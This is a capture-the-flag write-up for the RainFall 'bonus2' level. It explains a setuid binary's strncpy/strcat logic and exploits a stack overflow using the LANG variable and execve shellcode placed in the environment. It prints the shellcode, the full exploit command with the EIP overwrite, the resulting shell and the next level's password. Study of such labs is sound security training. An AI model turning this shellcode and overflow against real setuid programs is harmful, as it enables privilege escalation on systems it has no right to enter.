# Bonus2

## Solution

* There is one file in our home, ```bonus2```, belonging to ```bonus3``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* For the sake of clarity, we won't display the very long disassembled code, but we will describe its behaviour:

	* ```main``` function returns ```1``` if there are not exactly two parameters passed to the program
	* it allocates on its stack a buffer a ```0x4c``` bytes buffer
	* the content of ```argv[1]``` is copied using ```strncpy``` with a limit of ```0x28 = 40``` bytes
	* the content of ```argv[2]``` is copied using ```strncpy``` at the offset ```0x28 = 40``` bytes, with a limit of ```0x20 = 32``` bytes
	* ```getenv``` gets the value of environment variable ```LANG``` :
		* if the string starts with ```fi```: global variable ```language``` is set to 1
		* if it starts with ```nl```: global variable ```language``` is set to 2
		* else, it keeps ```0``` value
	* ```greetuser``` function is then called
	* ```greetuser``` allocates on its stack a ```0x40 = 64``` bytes buffer
	* depending on the value of ```language```, it fills the buffer with:
		*  ```Hyvää päivää ``` if ```language``` is equal to ```1```
		* ```Goedemiddag! ``` if ```language``` is equal to ```2```
		* ```Hello ``` if ```language``` is equal to ```0```
	* it then concatenates this buffer with the buffer allocated in ```main``` stackframe

* What we did with all of that:

	* our goal wa to use the buffer allocated in ```greetuser``` to write an address of a shellcode in place of the former ```eip``` address
	* the offset between the beginning of the buffer and the location of former ```eip``` address is ```0x4c = 76``` bytes : it means that we wanted to write the address of our shellcode ```76``` bytes after the beginning of ```final_buf```
	* as ```argv[1]``` is copied in the ```main``` buffer using ```strncpy```, if there is no ```\0``` in the first ```40``` bytes, the copy won't be terminated
	* we used it to concatenate ```argv[1]``` with ```argv[2]```, allowing us to store a string up to ```40 + 32 = 72``` bytes
	* before launching the program we made two modifications in the environment :
		* ```export LANG=fi``` so that the string used to greet user would be ```Hyvää päivää ``` (```18``` bytes as ```ä``` is ```2``` bytes)
		* ```export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')"` ``` to store the shellcode the environment
	* we then used the same program used in ```bonus0``` to get an approximative address of ```SHELLCODE```:
	```
	bonus2@RainFall:~$ /var/crash/env SHELLCODE
	SHELLCODE: 0xbffff4d0
	```
	* we could now exploit the vulnerability of ```bonus2``` file:
	```
	bonus2@RainFall:~$ ./bonus2 `python -c "print('A' * 40)"` `python -c "print('B' * 18 + 'd0f4ffbf'.decode('hex'))"`
	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
	$ cd ../bonus3; cat .pass
	71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
	```
	* we used a total of ```58``` padding chars as ```18 (bytes of the finnish greeting) + 58 = 76``` (offset between beginning of the buffer and former ```eip``` address location)
